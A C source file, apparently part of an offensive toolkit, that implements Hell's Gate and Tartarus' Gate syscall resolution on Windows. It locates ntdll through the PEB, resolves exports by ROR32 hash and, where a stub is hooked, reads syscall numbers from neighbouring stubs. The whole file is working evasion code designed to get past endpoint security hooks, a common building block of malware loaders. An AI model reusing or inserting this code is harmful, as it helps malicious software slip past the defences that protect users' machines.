#include <Windows.h>
#include <stdio.h>
#include "structs.h"
#include "common.h"

#define NO_ERR0R							000
#define ERR0R_INITIALIZING_NTDLL_CONFIG		100
#define ERR0R_GETTING_SYS_ADDRESS			150
#define ERR0R_GETTING_SYS_NUMBER			200

#define UP -32
#define DOWN 32


VX_TABLE_ENTRY VxTbleEntry = { 0 };

struct NtdllConfig NtdllConfigStruct = { 0 };

VOID InitializeVxTable(INT Rotr32Hash, INT Rotr32Seed) {
	VxTbleEntry.Rotr32Hash = Rotr32Hash;
	VxTbleEntry.Rotr32Seed = Rotr32Seed;
}

BOOL InitializeNtdllConfigStruct() {

	PPEB pPeb = (PPEB)__readgsqword(0x60);
	if (pPeb == NULL || pPeb->OSMajorVersion != 0xA) {
		return FALSE;
	}

	PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);
	
	PVOID pNtdll = pDte->DllBase;
	if (pNtdll == NULL) {
		return FALSE;
	}

	PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)pNtdll;
	if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)((PBYTE)pNtdll + pDosHdr->e_lfanew);
	if (pNtHdr->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	PIMAGE_EXPORT_DIRECTORY pIED = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pNtdll + pNtHdr->OptionalHeader.DataDirectory[0].VirtualAddress);
	if (pIED == NULL) {
		return FALSE;
	}

	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pNtdll + pIED->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pNtdll + pIED->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pNtdll + pIED->AddressOfNameOrdinals);


	NtdllConfigStruct.pNtdll = pNtdll;
	NtdllConfigStruct.pDosHdr = pDosHdr;
	NtdllConfigStruct.pNtHdr = pNtHdr;
	NtdllConfigStruct.pIED = pIED;
	NtdllConfigStruct.pdwAddressOfFunctions = pdwAddressOfFunctions;
	NtdllConfigStruct.pdwAddressOfNames = pdwAddressOfNames;
	NtdllConfigStruct.pwAddressOfNameOrdinales = pwAddressOfNameOrdinales;

	return TRUE;

}

// exported
BOOL InitializeSyscallviaTartarus(INT Rotr32Hash, INT Rotr32Seed, PDWORD ERR0R) {
	
	*ERR0R = NO_ERR0R;

    InitializeVxTable(Rotr32Hash, Rotr32Seed);

    if (NtdllConfigStruct.pNtdll == NULL ||
        NtdllConfigStruct.pdwAddressOfFunctions == NULL ||
        NtdllConfigStruct.pdwAddressOfNames == NULL ||
        NtdllConfigStruct.pwAddressOfNameOrdinales == NULL  ) {

        if (!InitializeNtdllConfigStruct()) {
            *ERR0R = ERR0R_INITIALIZING_NTDLL_CONFIG;
            return FALSE;
        }
    }

	for (WORD cx = 0; cx < NtdllConfigStruct.pIED->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)NtdllConfigStruct.pNtdll + NtdllConfigStruct.pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)NtdllConfigStruct.pNtdll + NtdllConfigStruct.pdwAddressOfFunctions[NtdllConfigStruct.pwAddressOfNameOrdinales[cx]];
		if (HashStringRotr32A(pczFunctionName, VxTbleEntry.Rotr32Seed) == VxTbleEntry.Rotr32Hash) {
			VxTbleEntry.pAddress = pFunctionAddress;

			// First opcodes should be :
			//    MOV R10, RCX
			//    MOV RAX, <syscall>
			if (*((PBYTE)pFunctionAddress) == 0x4c
				&& *((PBYTE)pFunctionAddress + 1) == 0x8b
				&& *((PBYTE)pFunctionAddress + 2) == 0xd1
				&& *((PBYTE)pFunctionAddress + 3) == 0xb8
				&& *((PBYTE)pFunctionAddress + 6) == 0x00
				&& *((PBYTE)pFunctionAddress + 7) == 0x00) {

				BYTE high = *((PBYTE)pFunctionAddress + 5);
				BYTE low = *((PBYTE)pFunctionAddress + 4);
				VxTbleEntry.wSystemCall = (high << 8) | low;

				return TRUE;
			}
			//if hooked check the neighborhood to find clean syscall
			if (*((PBYTE)pFunctionAddress) == 0xe9) {
				for (WORD idx = 1; idx <= 500; idx++) {
					// check neighboring syscall down
					if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4c
						&& *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 + idx * DOWN) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 + idx * DOWN) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 + idx * DOWN) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + idx * DOWN) == 0x00) {
						BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * DOWN);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * DOWN);
						VxTbleEntry.wSystemCall = (high << 8) | low - idx;

						return TRUE;
					}
					// check neighboring syscall up
					if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4c
						&& *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 + idx * UP) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 + idx * UP) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 + idx * UP) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + idx * UP) == 0x00) {
						BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * UP);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * UP);
						VxTbleEntry.wSystemCall = (high << 8) | low + idx;

						return TRUE;
					}

				}
				*ERR0R = ERR0R_GETTING_SYS_NUMBER;
				return FALSE;
			}
			if (*((PBYTE)pFunctionAddress + 3) == 0xe9) {
				for (WORD idx = 1; idx <= 500; idx++) {
					// check neighboring syscall down
					if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4c
						&& *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 + idx * DOWN) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 + idx * DOWN) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 + idx * DOWN) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + idx * DOWN) == 0x00) {
						BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * DOWN);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * DOWN);
						VxTbleEntry.wSystemCall = (high << 8) | low - idx;
						return TRUE;
					}
					// check neighboring syscall up
					if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4c
						&& *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 + idx * UP) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 + idx * UP) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 + idx * UP) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + idx * UP) == 0x00) {
						BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * UP);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * UP);
						VxTbleEntry.wSystemCall = (high << 8) | low + idx;
						return TRUE;
					}

				}
				*ERR0R = ERR0R_GETTING_SYS_NUMBER;
				return FALSE;
			}
		}
	}
	*ERR0R = ERR0R_GETTING_SYS_ADDRESS;
	return FALSE;
}


// exported
BOOL InitializeSyscallviaHellsGate(INT Rotr32Hash, INT Rotr32Seed, PDWORD ERR0R) {
	
	*ERR0R = NO_ERR0R;

	InitializeVxTable(Rotr32Hash, Rotr32Seed);

	if (NtdllConfigStruct.pNtdll == NULL ||
		NtdllConfigStruct.pdwAddressOfFunctions == NULL ||
		NtdllConfigStruct.pdwAddressOfNames == NULL ||
		NtdllConfigStruct.pwAddressOfNameOrdinales == NULL) {

		if (!InitializeNtdllConfigStruct()) {
			*ERR0R = ERR0R_INITIALIZING_NTDLL_CONFIG;
			return FALSE;
		}
	}

	for (WORD cx = 0; cx < NtdllConfigStruct.pIED->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)NtdllConfigStruct.pNtdll + NtdllConfigStruct.pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)NtdllConfigStruct.pNtdll + NtdllConfigStruct.pdwAddressOfFunctions[NtdllConfigStruct.pwAddressOfNameOrdinales[cx]];

		if (HashStringRotr32A(pczFunctionName, VxTbleEntry.Rotr32Seed) == VxTbleEntry.Rotr32Hash) {
			VxTbleEntry.pAddress = pFunctionAddress;

			// Quick and dirty fix in case the function has been hooked
			WORD cw = 0;
			while (TRUE) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05) {
					*ERR0R = ERR0R_GETTING_SYS_NUMBER;
					return FALSE;
				}

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3) {
					*ERR0R = ERR0R_GETTING_SYS_NUMBER;
					return FALSE;
				}
				// First opcodes should be :
				//    MOV R10, RCX
				//    MOV RCX, <syscall>
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					VxTbleEntry.wSystemCall = (high << 8) | low;
					return TRUE;
				}

				cw++;
			};
		}


	}
	*ERR0R = ERR0R_GETTING_SYS_ADDRESS;
	return FALSE;
}


//exported
PVOID getSyscallAddress() {
	return VxTbleEntry.pAddress;
}

//exported
WORD getSyscallNumber() {
	return VxTbleEntry.wSystemCall;
}


